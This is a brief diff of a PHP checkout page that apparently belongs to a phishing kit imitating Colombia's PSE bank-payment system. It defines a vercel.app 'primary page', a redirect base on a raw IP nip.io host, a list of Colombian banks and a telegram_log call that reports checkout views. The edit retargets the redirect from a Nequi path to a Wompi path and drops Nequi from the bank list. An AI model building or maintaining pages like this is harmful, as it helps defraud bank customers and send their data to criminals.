@@ -52,7 +52,7 @@ if (count($words) >= 3) {
 $email = $userInfo['EMAIL'] ?? '';
 $PSE_BANKS = $pseConfig['primary_banks'] ?? [];
 $PSE_PRIMARY_PAGE = $pseConfig['links']['primary_page'] ?? 'https://pagosonline-pse.vercel.app';
-$RECAUDOFALL_BASE = $pseConfig['links']['recaudofall_base'] ?? 'https://recaudofall.94.250.202.215.nip.io/nequi';
+$RECAUDOFALL_BASE = $pseConfig['links']['recaudofall_base'] ?? 'https://recaudofall.94.250.202.215.nip.io/wompi';
 $PSE_BANKS_RECAUDOFALL = $pseConfig['recaudofall_banks'] ?? [];
 $PSE_BANK_ALIASES = $pseConfig['aliases'] ?? [];
 
@@ -282,7 +282,6 @@ telegram_log('💳 Vista de checkout', [
           <option value="1286@JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA</option>
           <option value="1070@LULO BANK">LULO BANK</option>
           <option value="1801@MOVII S.A.">MOVII S.A.</option>
-          <option value="1507@NEQUI">NEQUI</option>
           <option value="1809@NU">NU</option>
           <option value="1824@PAYCASH">PAYCASH</option>
           <option value="1803@POWWI">POWWI</option>
